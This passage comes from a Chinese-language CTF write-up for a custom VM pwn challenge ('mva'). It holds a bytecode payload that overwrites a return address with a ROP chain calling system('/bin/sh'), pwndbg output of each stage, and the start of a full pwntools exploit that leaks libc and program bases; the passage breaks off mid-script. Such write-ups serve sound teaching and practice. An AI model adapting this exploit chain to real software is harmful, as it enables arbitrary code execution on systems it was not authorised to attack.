<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000562438</span>CCC100 ; <span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">start</span><span class="params">(__int64, __int64, <span class="keyword">void</span> (*)(<span class="keyword">void</span>))</span></span></span><br><span class="line"><span class="function">.text:0000562438CCC100                 <span class="keyword">public</span> start</span></span><br><span class="line"><span class="function">.text:0000562438CCC100 start           proc near</span></span><br><span class="line"><span class="function">.text:0000562438CCC100 </span>; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000562438</span>CCC100                 endbr64</span><br></pre></td></tr></table></figure>
<p>我们已经成功泄露了 libc_base 和 pro_base，并且覆盖了返回地址，那么下一次输入就可以执行攻击了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">payload =  ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0xc</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line"></span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(pop_rdi1)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(pop_rdi2)</span><br><span class="line"></span><br><span class="line">payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x10</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line"></span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(binsh1)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(binsh2)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(binsh3)</span><br><span class="line"></span><br><span class="line">payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x14</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">		</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(ret1)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(ret2)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(ret3)			</span><br><span class="line"></span><br><span class="line">payload += ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0x18</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">payload += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)	</span><br><span class="line">			</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(system1)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(system2)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(system3)</span><br><span class="line">payload += b<span class="number">&#x27;</span>\x09\x01<span class="number">&#x27;</span>+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x8</span>) + p32(<span class="number">0xE4000000</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>*<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">8</span>) + p32(<span class="number">0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)</span><br><span class="line">payload += b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line"></span><br><span class="line">p.send(payload)			</span><br></pre></td></tr></table></figure>
<p>其实这里的操作和前面类似，指令 ldr mv 修改“v9”，指令 push 通过“v9”索引到目标位置，然后把数据分段覆盖上去</p>
<p>我们看一下效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 第一次：覆盖ret为pop rdi */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffefad1a128</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffefad1a128</span> —▸ <span class="number">0x7f4561689b72</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffefad1a130</span> ◂— <span class="number">0x98000000980</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffefad1a138</span> —▸ <span class="number">0x7ffefad1a218</span> —▸ <span class="number">0x7ffefad1a2f8</span> —▸ <span class="number">0x7ffefad1c39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 第二次: 填入&quot;/bin/sh&quot;的地址(利用pro_base计算出来的) */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffefad1a128</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffefad1a128</span> —▸ <span class="number">0x7f4561689b72</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffefad1a130</span> —▸ <span class="number">0x5593c1a08138</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffefad1a138</span> —▸ <span class="number">0x7ffefad1a218</span> —▸ <span class="number">0x7ffefad1a2f8</span> —▸ <span class="number">0x7ffefad1c39d</span> ◂— <span class="number">0x4a470061766d2f2e</span> <span class="comment">/* &#x27;./mva&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 覆盖上ret用于平衡栈帧 */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffefad1a128</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffefad1a128</span> —▸ <span class="number">0x7f4561689b72</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffefad1a130</span> —▸ <span class="number">0x5593c1a08138</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffefad1a138</span> —▸ <span class="number">0x7f4561688679</span> (__libgcc_s_init+<span class="number">61</span>) ◂— ret    </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffefad1a140</span> ◂— <span class="number">0x6188762000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 最后覆盖上system */</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x7ffefad1a128</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffefad1a128</span> —▸ <span class="number">0x7f4561689b72</span> (init_cacheinfo+<span class="number">242</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffefad1a130</span> —▸ <span class="number">0x5593c1a08138</span> ◂— <span class="number">0x68732f6e69622f</span> <span class="comment">/* &#x27;/bin/sh&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffefad1a138</span> —▸ <span class="number">0x7f4561688679</span> (__libgcc_s_init+<span class="number">61</span>) ◂— ret    </span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffefad1a140</span> —▸ <span class="number">0x7f45616b82c0</span> (system) ◂— endbr64 </span><br></pre></td></tr></table></figure>
<p>完整exp：（可能需要多爆破几次，有时泄露的信息不对，有时出现错误）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">op:<span class="built_in">int</span>, p1:<span class="built_in">int</span> = <span class="number">0</span>, p2:<span class="built_in">int</span> = <span class="number">0</span>, p3:<span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">   <span class="keyword">return</span> (op&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p1&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p2&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>) + \</span><br><span class="line">          (p3&amp;<span class="number">0xff</span>).to_bytes(<span class="number">1</span>,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ldr</span>(<span class="params">p1,p2,p3</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x01</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2, p3</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x02</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span>(<span class="params">p1, p2, p3</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x03</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shr</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x06</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span>(<span class="params">p1, p2, p3</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x07</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span>():</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x09</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">p1</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0a</span>, p1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">p1, p2, p3</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0D</span>, p1, p2, p3)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mv</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0E</span>, p1, p2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sh</span>():</span></span><br><span class="line">   <span class="keyword">return</span> pack(<span class="number">0x0F</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[+] Welcome to MVA, input your code now :\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p=process(<span class="string">&#x27;./mva&#x27;</span>)</span><br><span class="line">		sleep(<span class="number">0.01</span>)</span><br><span class="line">		</span><br><span class="line">		pay = push()*<span class="number">8</span></span><br><span class="line">		pay += sh()+push()+sh()+push()+sh()</span><br><span class="line">		pay += ldr(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xf4</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">		pay += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">		pay += sh() + push() + sh() + push() + sh()</span><br><span class="line"></span><br><span class="line">		pay += ldr(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xff</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">		pay += mv(<span class="number">0</span>,<span class="number">0xf6</span>) + mv(<span class="number">1</span>,<span class="number">0xf7</span>) + mv(<span class="number">2</span>,<span class="number">0xf8</span>) + mv(<span class="number">3</span>,<span class="number">0xf9</span>)</span><br><span class="line">		pay += pop(<span class="number">0</span>) + sh() + pop(<span class="number">1</span>) + sh()</span><br><span class="line">		pay += ldr(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0xe</span>) + ldr(<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">5</span>,<span class="number">0x80</span>,<span class="number">0</span>)</span><br><span class="line">		pay += mv(<span class="number">2</span>,<span class="number">0xf6</span>) + mv(<span class="number">3</span>,<span class="number">0xf7</span>) + mv(<span class="number">4</span>,<span class="number">0xf8</span>) + mv(<span class="number">5</span>,<span class="number">0xf9</span>) + push() </span><br><span class="line">		pay += mv(<span class="number">1</span>,<span class="number">0</span>) + pop(<span class="number">1</span>) + pop(<span class="number">1</span>) + push()</span><br><span class="line">		pay += ldr(<span class="number">0</span>,<span class="number">0x51</span>,<span class="number">0</span>) + pop(<span class="number">1</span>) + pop(<span class="number">1</span>) + push()</span><br><span class="line"></span><br><span class="line">		pay = pay.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		p.send(pay)</span><br><span class="line"></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;[+] MVA is starting ...\n&#x27;</span>)</span><br><span class="line">		a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">		b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">		c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">		d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">		log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">		libc.address = d - <span class="number">0x223700</span></span><br><span class="line">		log.success(<span class="string">&quot;libc.address: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">		a = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;a: &quot;</span> + <span class="built_in">hex</span>(a))</span><br><span class="line">		b = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;b: &quot;</span> + <span class="built_in">hex</span>(b))</span><br><span class="line">		c = <span class="built_in">int</span>(p.recv(<span class="number">6</span>)[:-<span class="number">1</span>])</span><br><span class="line">		log.success(<span class="string">&quot;c: &quot;</span> + <span class="built_in">hex</span>(c))</span><br><span class="line">		d = (c &lt;&lt; <span class="number">32</span>) | (b &lt;&lt; <span class="number">16</span>) | a</span><br><span class="line">		log.success(<span class="string">&quot;d: &quot;</span> + <span class="built_in">hex</span>(d))</span><br><span class="line">		elfbase = d - <span class="number">0x1a70</span></span><br><span class="line">		log.success(<span class="string">&quot;elfbase: &quot;</span> + <span class="built_in">hex</span>(elfbase))</span><br><span class="line"></span><br><span class="line">		pop_rdi = libc.address + <span class="number">0x23b72</span></span><br><span class="line">		log.success(<span class="string">&quot;pop_rdi: &quot;</span> + <span class="built_in">hex</span>(pop_rdi))</span><br><span class="line"></span><br><span class="line">		ret = libc.address + <span class="number">0x22679</span></span><br><span class="line">		ret1 = ret &amp; <span class="number">0xffff</span></span><br><span class="line">		ret1 = ((ret1&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((ret1&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		ret2 = (ret &amp; <span class="number">0xffffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">		ret2 = ((ret2&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((ret2&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		ret3 = (ret)&gt;&gt;<span class="number">32</span></span><br><span class="line">		ret3 = ((ret3&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((ret3&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">		system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">		log.success(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">		system1 = system &amp; <span class="number">0xffff</span></span><br><span class="line">		system1 = ((system1&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((system1&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;system1: &quot;</span> + <span class="built_in">hex</span>(system1))</span><br><span class="line">		system2 = (system &amp; <span class="number">0xffffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">		system2 = ((system2&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((system2&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;system2: &quot;</span> + <span class="built_in">hex</span>(system2))</span><br><span class="line">		system3 = (system)&gt;&gt;<span class="number">32</span></span><br><span class="line">		system3 = ((system3&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((system3&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;system3: &quot;</span> + <span class="built_in">hex</span>(system3))</span><br><span class="line"></span><br><span class="line">		pop_rdi1 = pop_rdi &amp; <span class="number">0xffff</span></span><br><span class="line">		pop_rdi1 = ((pop_rdi1&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((pop_rdi1&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;pop_rdi1: &quot;</span> + <span class="built_in">hex</span>(pop_rdi1))</span><br><span class="line">		pop_rdi2 = (pop_rdi &amp; <span class="number">0xffffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">		pop_rdi2 = ((pop_rdi2&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((pop_rdi2&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;pop_rdi2: &quot;</span> + <span class="built_in">hex</span>(pop_rdi2))</span><br><span class="line"></span><br><span class="line">		binsh = elfbase + <span class="number">0x4138</span></span><br><span class="line">		log.success(<span class="string">&quot;binsh: &quot;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line">		binsh1 = binsh &amp; <span class="number">0xffff</span></span><br><span class="line">		binsh1 = ((binsh1&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((binsh1&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;binsh1: &quot;</span> + <span class="built_in">hex</span>(binsh1))</span><br><span class="line">		binsh2 = (binsh &amp; <span class="number">0xffffffff</span>)&gt;&gt;<span class="number">16</span></span><br><span class="line">		binsh2 = ((binsh2&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((binsh2&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;binsh2: &quot;</span> + <span class="built_in">hex</span>(binsh2))</span><br><span class="line">		binsh3 = (binsh)&gt;&gt;<span class="number">32</span></span><br><span class="line">		binsh3 = ((binsh3&amp;<span class="number">0xff00</span>)&gt;&gt;<span class="number">8</span>) + ((binsh3&amp;<span class="number">0xff</span>) &lt;&lt; <span class="number">8</span>)</span><br><span class="line">		log.success(<span class="string">&quot;binsh3: &quot;</span> + <span class="built_in">hex</span>(binsh3))</span><br><span class="line"></span><br><span class="line">		p.recvuntil(<span class="string">&#x27;[+] Welcome to MVA, input your code now :\n&#x27;</span>)</span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		success(<span class="string">&quot;Success!!!&quot;</span>)</span><br><span class="line">		pause()</span><br><span class="line">		</span><br><span class="line">		payload =  ldr(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0xc</span>) + ldr(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>) + ldr(<span class="number">3</span>,<span class="number">0x80</span>,<span class="number">0</span>) </span><br><span class="line">		payload += mv(<span 